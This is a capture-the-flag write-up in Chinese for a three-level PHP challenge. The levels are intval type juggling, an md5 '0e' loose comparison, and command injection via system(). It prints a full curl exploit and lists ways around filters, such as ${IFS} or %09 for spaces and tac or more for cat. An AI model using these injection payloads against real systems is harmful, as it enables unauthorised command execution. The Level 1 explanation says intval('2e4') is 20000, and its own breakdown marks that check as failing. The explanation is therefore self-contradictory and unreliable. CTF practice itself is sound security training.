# [WUSTCTF2020]朴实无华

## 题目概述
一道 PHP 代码审计题，包含三层关卡：intval 弱类型绕过、md5 自比较绕过、命令注入绕过空格和 cat 过滤。

## 信息收集
1. 访问首页，发现 PHP 5.5.38 环境，页面提示 "Hack me"
2. 查看 robots.txt，发现 `/fAke_f1agggg.php` 被禁止访问
3. 访问 fake flag 页面，响应头中发现 `Look_at_me: /fl4g.php` 提示
4. 访问 `/fl4g.php`，获得完整 PHP 源码

## 漏洞分析

### Level 1: intval 弱类型绕过
```php
if(intval($num) < 2020 && intval($num + 1) > 2021)
```
- 条件看似矛盾：需要 $num < 2020 且 $num + 1 > 2021
- 利用 PHP 弱类型：字符串 `"2e4"` 在算术运算时被解析为 20000，intval("2e4")=20000，intval("2e4"+1)=20001
- Payload: `num=2e4`

### Level 2: md5 自比较绕过
```php
if($md5 == md5($md5))
```
- 利用 PHP 弱类型比较：以 `0e` 开头的字符串会被当作科学计数法解析为 0
- 需要找到一个字符串，其 md5 值也是 `0e` 开头
- 经典 payload: `md5=0e215962017`，其 md5 值为 `0e387426812770038351355401172525`

### Level 3: 命令注入绕过
```php
if(!strstr($get_flag, " ")){
    $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
    system($get_flag);
}
```
- 过滤空格：用 `${IFS}` 替代（URL 编码为 `%24%7BIFS%7D`）
- 过滤 cat：用 `tac`、`more`、`less` 等替代
- 先用 `ls` 发现 flag 文件名很长，再用 `tac` 读取

## 利用过程

```bash
# 最终 Payload
curl -s "http://target/fl4g.php?num=2e4&md5=0e215962017&get_flag=tac%24%7BIFS%7Dfllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag"

# 分解：
# num=2e4          -> intval(20000) < 2020 ❌ 但 intval("2e4"+1)=20001 > 2021 ✓
# md5=0e215962017  -> md5("0e215962017") = "0e..." 弱比较相等
# get_flag=tac${IFS}flagfile -> tac 命令读取文件，${IFS} 替代空格
```

## 复现步骤
1. 访问首页，查看 robots.txt
2. 访问 fake flag 页面，从响应头获取真实 flag 页面路径
3. 分析 fl4g.php 源码，识别三层绕过逻辑
4. 构造 payload 绕过三层关卡
5. 执行命令获取 flag

## 技术总结

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| PHP 弱类型 | intval 比较 | `num=2e4` | 科学计数法字符串在算术运算时自动转换 |
| MD5 弱比较 | == 比较 | `md5=0e215962017` | 0e 开头字符串被解析为 0 |
| 命令注入 | system() | `tac${IFS}file` | ${IFS} 替代空格，tac 替代 cat |

## 知识总结
- **PHP 弱类型陷阱**：字符串在算术运算时会自动转换为数值，科学计数法字符串如 `"2e4"` 会变成 20000
- **MD5 0e 碰撞**：经典字符串 `0e215962017` 的 md5 值也是 0e 开头，满足 `$a == md5($a)` 条件
- **命令注入绕过技巧**：空格可用 `${IFS}`、`$IFS$9`、`%09`(tab) 替代；cat 可用 tac、more、head、tail 替代
- **信息收集路径**：robots.txt → 响应头 → 源码审计
